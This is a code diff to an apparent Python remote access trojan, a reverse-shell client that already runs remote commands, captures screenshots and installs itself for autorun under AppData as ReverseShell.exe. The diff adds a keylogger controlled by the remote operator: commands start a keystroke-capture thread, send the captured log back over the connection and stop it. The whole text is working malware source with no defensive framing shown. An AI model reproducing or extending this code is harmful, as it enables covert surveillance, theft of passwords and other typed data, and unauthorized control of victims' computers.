@@ -2,12 +2,18 @@
 import base64
 import socket
 import json
+import threading
 import time
 import os
 import shutil
 import sys
 import requests
 import PIL.ImageGrab
+from keylogger import keylogger
+
+location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\%username%\AppData\Roaming\ReverseShell.exe
+keylogger_path = os.environ["appdata"] + "\\keylog.txt"
+debug = False
 
 
 def client():
@@ -25,6 +31,7 @@ def client():
 
 
 def shell():
+    global debug
     while True:
         cmd = reliable_recv()
         if cmd == "exit":
@@ -50,6 +57,8 @@ def shell():
             screenshot()
         elif cmd.startswith("isadmin"):
             is_admin()
+        elif cmd.startswith("keylogger"):
+            keyloggerUtil(cmd)
         else:
             try:
                 proc = os.popen(cmd)  # open a process to run commands on shell
@@ -153,7 +162,7 @@ def persistence():
     """
     Acquire persistence writing on Windows registry to autorun on startup
     """
-    location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\%username%\AppData\Roaming\ReverseShell.exe
+
     if not os.path.exists(location):
         # Copy this .exe file into the specified location
         shutil.copyfile(sys.executable, location)
@@ -193,8 +202,27 @@ def is_admin():
         return False
 
 
+def keyloggerUtil(cmd):
+    global t1
+    """
+    manage keylogger util
+    :param cmd:
+    """
+    cmd = cmd[10:]
+    if cmd.startswith("start"):
+        t1 = threading.Thread(target=keylogger.keylogger_start)
+        t1.start()
+        reliable_send("keylogger started")
+    elif cmd.startswith("dump"):
+        log = keylogger.get_log()
+        reliable_send(log)
+    elif cmd.startswith("stop"):
+        os.kill(t1.native_id, 0)
+        reliable_send("keylogger stopped")
+    else:
+        reliable_send("unkown keylogger command")
+
+
 if __name__ == '__main__':
-    global debug
-    debug = False
     client()
     shell()
